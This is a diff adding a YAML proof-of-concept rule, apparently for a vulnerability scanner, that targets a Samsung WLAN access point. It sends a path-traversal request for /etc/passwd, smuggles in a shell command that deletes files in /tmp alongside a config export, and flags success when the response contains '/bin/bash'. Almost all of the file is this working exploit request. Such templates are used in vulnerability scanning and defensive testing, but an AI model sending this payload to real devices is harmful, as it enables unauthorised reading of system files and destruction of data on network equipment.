@@ -1,0 +1,14 @@
+name: poc-yaml-samsung-wlan-ap-readfile
+rules:
+  - method: POST
+    path: /(download)/../etc/passwd
+    body: command1=shell%3Arm+-f+%2Ftmp%2F*.csv&command2=config+radius+internal+export+%EB%B2%85%EC%8A%A4%EB%B6%81_7%EC%B8%B5_inrad_20210218111107.csv
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"/bin/bash")
+detail:
+  author: mjx-team(www.mjx-team.com/)
+
+  links:
+    - https://www.mjx-team.com/
+    
